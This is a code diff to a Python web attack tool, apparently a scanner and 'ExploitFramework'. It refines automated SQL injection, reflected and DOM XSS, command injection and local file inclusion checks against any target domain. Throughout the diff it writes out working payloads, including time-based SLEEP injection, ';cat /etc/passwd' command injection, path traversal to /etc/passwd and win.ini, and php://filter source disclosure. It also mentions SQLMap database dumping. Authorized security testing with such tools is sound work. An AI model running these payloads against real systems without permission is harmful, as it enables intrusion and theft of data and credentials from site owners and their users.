@@ -1892,7 +1892,8 @@ class DeepScanner:
         for p in upload_paths:
             if self.cancelled: break
             code, body = self._http_get(p)
-            if code in (200, 403):
+            # Only report 200 with actual upload form content — 403 just means path exists but forbidden
+            if code == 200 and any(x in body.lower() for x in ["upload", "file", "multipart", "enctype"]):
                 found.append(p)
                 self._log(f"  [Upload] {code}  /{p}", "FOUND")
         self.results["upload_check"] = "\n".join(found) or "No upload paths found"
@@ -1901,19 +1902,42 @@ class DeepScanner:
     def run_sqli_scan(self):
         if not self._enabled("sqli_scan"): return
         self._log("Quick SQLi surface scan…", "STEP")
-        payloads = ["'", "''", "' OR '1'='1", "1 AND 1=1", "1; SELECT 1--"]
-        errors   = ["sql syntax", "mysql_fetch", "ORA-", "syntax error",
-                    "unclosed quotation", "pg_query", "sqlite_"]
+        payloads = ["'", "' OR '1'='1'--", "1 UNION SELECT NULL--"]
+        sql_errors = [
+            "sql syntax", "mysql_fetch", "ora-0", "unclosed quotation mark",
+            "pg_query", "sqlite_", "you have an error in your sql",
+            "microsoft ole db", "warning: mysql", "odbc sql",
+        ]
         findings = []
-        for pl in payloads:
+        # First discover real params from homepage
+        try:
+            base_body = self._http_get("", timeout=6)[1]
+            real_params = set()
+            for m in re.finditer(r'<(?:input|select)[^>]+name=["\']?([^"\'>\s]+)', base_body, re.I):
+                n = m.group(1).strip()
+                if n and n.lower() not in ("submit", "csrf", "token", "_token"):
+                    real_params.add(n)
+            for m in re.finditer(r'href=["\'][^"\']*\?([^"\'#\s]+)', base_body, re.I):
+                for part in m.group(1).split("&"):
+                    k = part.split("=")[0].strip()
+                    if k and re.match(r'^[\w\-]{1,32}$', k):
+                        real_params.add(k)
+            params = list(real_params)[:10] if real_params else ["id", "q", "search"]
+        except Exception:
+            params = ["id", "q", "search"]
+        for param in params:
             if self.cancelled: break
-            code, body = self._http_get(f"?id={pl}", timeout=6)
-            low = body.lower()
-            for err in errors:
-                if err.lower() in low:
-                    findings.append(f"Payload '{pl}' triggered: {err}")
-                    self._log(f"  [SQLi] Error triggered by payload: {pl}", "ERROR")
-                    break
+            # Baseline to avoid false positives from pages that already contain SQL-like text
+            _, baseline = self._http_get(f"?{param}=1", timeout=6)
+            for pl in payloads:
+                if self.cancelled: break
+                code, body = self._http_get(f"?{param}={pl}", timeout=6)
+                low = body.lower()
+                for err in sql_errors:
+                    if err in low and err not in baseline.lower():
+                        findings.append(f"?{param} — payload '{pl}' triggered: {err}")
+                        self._log(f"  [SQLi] Error triggered: ?{param}={pl} → {err}", "ERROR")
+                        break
         self.results["sqli_scan"] = "\n".join(findings) or "No SQLi errors detected"
         self._prog(86)
 
@@ -1958,7 +1982,7 @@ class DeepScanner:
         if not self._enabled("vbulletin_rce"): return
         self._log("vBulletin RCE surface check…", "STEP")
         code, body = self._http_get("admincp/index.php")
-        if code in (200, 302):
+        if code == 200 and "vbulletin" in body.lower():
             self._log("  [vBulletin] Admin panel detected!", "FOUND")
             cves = query_cve("vbulletin")
             for cid, cdesc in cves[:3]:
@@ -2982,6 +3006,31 @@ class ExploitFramework:
         except:
             return 0, ""
 
+    def _discover_params(self, base_url: str) -> list:
+        """Crawl the target page and extract real query parameters from forms and links.
+        Returns list of param names found; falls back to common params if none found."""
+        found = set()
+        try:
+            _, body, _ = self._http_get(base_url, timeout=8)
+            # Extract form input/select/textarea names
+            for m in re.finditer(r'<(?:input|select|textarea)[^>]+name=["\']?([^"\'>\s]+)', body, re.I):
+                name = m.group(1).strip()
+                if name and name.lower() not in ("submit", "csrf", "token", "_token", "authenticity_token"):
+                    found.add(name)
+            # Extract query params from <a href> links on the same domain
+            for m in re.finditer(r'href=["\'][^"\']*\?([^"\'#\s]+)', body, re.I):
+                for part in m.group(1).split("&"):
+                    key = part.split("=")[0].strip()
+                    if key and re.match(r'^[\w\-]{1,32}$', key):
+                        found.add(key)
+        except Exception:
+            pass
+        params = list(found)
+        if not params:
+            # Only fall back to most generic params; do NOT test random ones
+            params = ["id", "page", "q", "search"]
+        return params[:20]  # cap at 20 to avoid excessive requests
+
     def run_sqli_exploit(self):
         """Advanced SQL injection testing."""
         self._log("=" * 50, "INFO")
@@ -2991,42 +3040,70 @@ class ExploitFramework:
         findings = []
         base_url = f"http://{self.domain}"
 
-        # Error-based SQLi
-        self._log("  [SQLi] Testing error-based injection...", "INFO")
-        error_payloads = [
-            ("'", ["sql syntax", "mysql_fetch", "ORA-", "pg_query", "sqlite_",
-                   "unclosed quotation", "microsoft ole db", "odbc sql"]),
-            ("1 OR 1=1--", ["sql syntax", "you have an error"]),
-            ("' UNION SELECT NULL--", ["union", "column"]),
-            ("1; WAITFOR DELAY '0:0:5'--", []),  # Time-based
-            ("1' AND SLEEP(3)--", []),  # MySQL time-based
-            ("' OR '1'='1", ["sql", "error", "warning"]),
-            ("admin'--", ["sql", "error", "login"]),
-        ]
+        # Discover real parameters from the target page
+        params = self._discover_params(base_url)
+        self._log(f"  [SQLi] Discovered params to test: {', '.join(params) or 'none'}", "INFO")
+        if not params:
+            self._log("  [SQLi] No injectable parameters found on page, skipping", "WARN")
+            self.results["sqli"] = findings
+            self._prog(20)
+            return
 
-        for payload, error_sigs in error_payloads:
+        # Error-based SQLi — only test params that actually exist on the page
+        self._log("  [SQLi] Testing error-based injection...", "INFO")
+        sql_error_sigs = [
+            "sql syntax", "mysql_fetch", "ora-0", "pg_query", "sqlite_",
+            "unclosed quotation mark", "microsoft ole db", "odbc sql server",
+            "you have an error in your sql", "warning: mysql", "supplied argument is not",
+            "invalid query", "sql command not properly ended",
+        ]
+        error_payloads = [
+            "'",
+            "' OR '1'='1'--",
+            "1 AND 1=2 UNION SELECT NULL--",
+        ]
+        tested_params = set()
+        for payload in error_payloads:
             if self.cancelled:
                 break
-            for param in ["id", "page", "cat", "user", "search", "q"]:
+            for param in params:
+                if self.cancelled:
+                    break
+                if (param, payload) in tested_params:
+                    continue
+                tested_params.add((param, payload))
+                # Get baseline response first (no injection)
+                _, baseline, _ = self._http_get(f"{base_url}/?{param}=1", timeout=6)
                 code, body, _ = self._http_get(f"{base_url}/?{param}={payload}", timeout=6)
                 body_low = body.lower()
-                for sig in error_sigs:
-                    if sig.lower() in body_low:
-                        findings.append(f"Error-based SQLi: param={param}, payload={payload}")
-                        self._log(f"  [SQLi] VULNERABLE: ?{param}={payload} → {sig}", "ERROR")
+                for sig in sql_error_sigs:
+                    # Only report if error sig present in injected response but NOT baseline
+                    if sig in body_low and sig not in baseline.lower():
+                        findings.append(f"Error-based SQLi: param={param}, payload={payload}, trigger={sig}")
+                        self._log(f"  [SQLi] VULNERABLE: ?{param}={payload} → error: {sig}", "ERROR")
                         break
 
-        # Blind SQLi (time-based)
+        # Blind SQLi (time-based) — require significant delay vs baseline
         self._log("  [SQLi] Testing time-based blind injection...", "INFO")
-        for param in ["id", "page"]:
+        for param in [p for p in params if p in ("id", "page", "cat", "search", "q")][:3]:
+            if self.cancelled:
+                break
             try:
-                start = time.time()
-                self._http_get(f"{base_url}/?{param}=1' AND SLEEP(3)--", timeout=8)
-                elapsed = time.time() - start
-                if elapsed >= 2.5:
-                    findings.append(f"Time-based blind SQLi: param={param}")
-                    self._log(f"  [SQLi] TIME-BASED BLIND: ?{param} (delay={elapsed:.1f}s)", "ERROR")
-            except:
+                # Baseline timing
+                t0 = time.time()
+                self._http_get(f"{base_url}/?{param}=1", timeout=10)
+                baseline_t = time.time() - t0
+
+                # Injection with SLEEP(5)
+                t1 = time.time()
+                self._http_get(f"{base_url}/?{param}=1' AND SLEEP(5)--", timeout=12)
+                injected_t = time.time() - t1
+
+                # Only flag if injected response is at least 4 seconds slower than baseline
+                if injected_t - baseline_t >= 4.0:
+                    findings.append(f"Time-based blind SQLi: param={param} (delay={injected_t:.1f}s vs baseline={baseline_t:.1f}s)")
+                    self._log(f"  [SQLi] TIME-BASED BLIND: ?{param} (delay +{injected_t-baseline_t:.1f}s)", "ERROR")
+            except Exception:
                 pass
 
         # SQLMap — interactive DB/table dump with simplified output
@@ -3098,40 +3175,59 @@ class ExploitFramework:
         findings = []
         base_url = f"http://{self.domain}"
 
+        # Discover real parameters from the target page
+        params = self._discover_params(base_url)
+        self._log(f"  [XSS] Params to test: {', '.join(params) or 'none'}", "INFO")
+        if not params:
+            self._log("  [XSS] No parameters found on page, skipping", "WARN")
+            self.results["xss"] = findings
+            self._prog(40)
+            return
+
+        # Unique marker to detect reflection without ambiguity
+        xss_marker = f"xss{self.session_id}"
         xss_payloads = [
-            '<script>alert(1)</script>',
-            '"><img src=x onerror=alert(1)>',
-            "'-alert(1)-'",
-            '<svg onload=alert(1)>',
-            '{{7*7}}',  # SSTI
-            '${7*7}',   # Template injection
-            '<img src=x onerror=alert(document.cookie)>',
-            '"><svg/onload=alert(String.fromCharCode(88,83,83))>',
-            "javascript:alert(1)//",
-            '<body onload=alert(1)>',
+            f'<script>{xss_marker}</script>',
+            f'"><img src=x onerror={xss_marker}>',
+            f'<svg onload={xss_marker}>',
+            f"'{xss_marker}'",
         ]
 
+        reported_params = set()
         for payload in xss_payloads:
             if self.cancelled:
                 break
-            for param in ["q", "search", "name", "input", "msg", "comment", "text"]:
+            for param in params:
+                if param in reported_params:
+                    continue
+                if self.cancelled:
+                    break
                 code, body, _ = self._http_get(
                     f"{base_url}/?{param}={payload}", timeout=6
                 )
-                if payload in body:
-                    findings.append(f"Reflected XSS: param={param}")
-                    self._log(f"  [XSS] REFLECTED: ?{param} → payload echoed!", "ERROR")
+                # Only flag if our unique marker is reflected in the response
+                if xss_marker in body:
+                    reported_params.add(param)
+                    findings.append(f"Reflected XSS: param={param}, payload echoed unescaped")
+                    self._log(f"  [XSS] REFLECTED: ?{param} → marker echoed unescaped!", "ERROR")
                     break
 
-        # DOM XSS indicators
-        self._log("  [XSS] Checking for DOM-based XSS indicators...", "INFO")
+        # DOM XSS: only report if URL-controlled input reaches dangerous sinks
+        # (Require both a sink AND an obvious URL param reflection pattern near it)
+        self._log("  [XSS] Checking for DOM-based XSS patterns...", "INFO")
         code, body, _ = self._http_get(base_url)
-        dom_sinks = ["document.write(", "innerHTML", "eval(", "setTimeout(",
-                     "location.href=", "document.location", "window.location"]
-        for sink in dom_sinks:
-            if sink in body:
-                findings.append(f"DOM XSS sink: {sink}")
-                self._log(f"  [XSS] DOM sink found: {sink}", "WARN")
+        # High-confidence DOM XSS patterns: sink directly reads location/hash/search
+        dom_patterns = [
+            r"document\.write\s*\(\s*(?:location|window\.location|document\.location)",
+            r"innerHTML\s*=\s*(?:location|window\.location|document\.location|unescape\(location)",
+            r"eval\s*\(\s*(?:location|window\.location|unescape\s*\()",
+            r"\.innerHTML\s*\+=?\s*(?:window\.)?location",
+        ]
+        for pat in dom_patterns:
+            if re.search(pat, body, re.I):
+                findings.append(f"High-confidence DOM XSS: location directly written to sink")
+                self._log(f"  [XSS] DOM XSS: URL location written directly to DOM sink", "ERROR")
+                break
 
         # XSStrike integration — simplified output
         if subprocess.run(["which", "xsstrike"], capture_output=True).returncode == 0:
@@ -3171,26 +3267,38 @@ class ExploitFramework:
         findings = []
         base_url = f"http://{self.domain}"
 
+        # Discover real parameters from the target page
+        params = self._discover_params(base_url)
+        self._log(f"  [CMDi] Params to test: {', '.join(params) or 'none'}", "INFO")
+        if not params:
+            self._log("  [CMDi] No parameters found on page, skipping", "WARN")
+            self.results["cmdi"] = findings
+            self._prog(55)
+            return
+
+        # Use highly specific indicators that cannot appear in normal responses
         cmdi_payloads = [
-            (";id", "uid="),
-            ("|id", "uid="),
-            ("$(id)", "uid="),
-            ("`id`", "uid="),
-            (";cat /etc/passwd", "root:"),
-            ("|cat /etc/passwd", "root:"),
-            ("& ping -c 1 127.0.0.1 &", "ttl"),
-            ("; whoami", "www-data"),
-            ("| uname -a", "linux"),
+            (";echo CMDI_CONFIRMED_wg", "CMDI_CONFIRMED_wg"),
+            ("|echo CMDI_CONFIRMED_wg", "CMDI_CONFIRMED_wg"),
+            ("$(echo CMDI_CONFIRMED_wg)", "CMDI_CONFIRMED_wg"),
+            (";cat /etc/passwd", "root:x:0:0:"),
+            ("|cat /etc/passwd", "root:x:0:0:"),
         ]
 
+        reported_params = set()
         for payload, indicator in cmdi_payloads:
             if self.cancelled:
                 break
-            for param in ["cmd", "exec", "command", "ping", "ip", "host", "url", "path"]:
+            for param in params:
+                if param in reported_params:
+                    continue
+                if self.cancelled:
+                    break
                 code, body, _ = self._http_get(
-                    f"{base_url}/?{param}={payload}", timeout=6
+                    f"{base_url}/?{param}={payload}", timeout=8
                 )
-                if indicator.lower() in body.lower():
+                if indicator in body:
+                    reported_params.add(param)
                     findings.append(f"Command injection: param={param}, payload={payload}")
                     self._log(f"  [CMDi] VULNERABLE: ?{param}={payload}", "ERROR")
 
@@ -3353,25 +3461,42 @@ class ExploitFramework:
         findings = []
         base_url = f"http://{self.domain}"
 
+        # Discover real parameters from the target page
+        params = self._discover_params(base_url)
+        self._log(f"  [LFI] Params to test: {', '.join(params) or 'none'}", "INFO")
+        if not params:
+            self._log("  [LFI] No parameters found on page, skipping", "WARN")
+            self.results["lfi_rfi"] = findings
+            self._prog(90)
+            return
+
+        # All indicators are non-empty and highly specific
         lfi_payloads = [
-            ("../../../../etc/passwd", "root:"),
-            ("....//....//....//etc/passwd", "root:"),
-            ("/etc/passwd%00", "root:"),
-            ("php://filter/convert.base64-encode/resource=index.php", "PD"),
-            ("php://input", ""),
+            ("../../../../etc/passwd", "root:x:0:0:"),
+            ("....//....//....//etc/passwd", "root:x:0:0:"),
+            ("/etc/passwd%00", "root:x:0:0:"),
+            ("php://filter/convert.base64-encode/resource=index.php", "<?php"),
             ("../../../../../../windows/win.ini", "[fonts]"),
             ("..\\..\\..\\..\\windows\\win.ini", "[fonts]"),
-            ("/proc/self/environ", "PATH="),
+            ("/proc/self/environ", "HTTP_HOST="),
         ]
 
+        reported_params = set()
         for payload, indicator in lfi_payloads:
             if self.cancelled:
                 break
-            for param in ["page", "file", "path", "include", "template", "doc", "lang"]:
+            if not indicator:
+                continue  # Skip any payload without a specific indicator
+            for param in params:
+                if param in reported_params:
+                    continue
+                if self.cancelled:
+                    break
                 code, body, _ = self._http_get(
                     f"{base_url}/?{param}={payload}", timeout=6
                 )
-                if indicator and indicator in body:
+                if indicator in body:
+                    reported_params.add(param)
                     findings.append(f"LFI: param={param}, payload={payload}")
                     self._log(f"  [LFI] VULNERABLE: ?{param}={payload}", "ERROR")
                     break
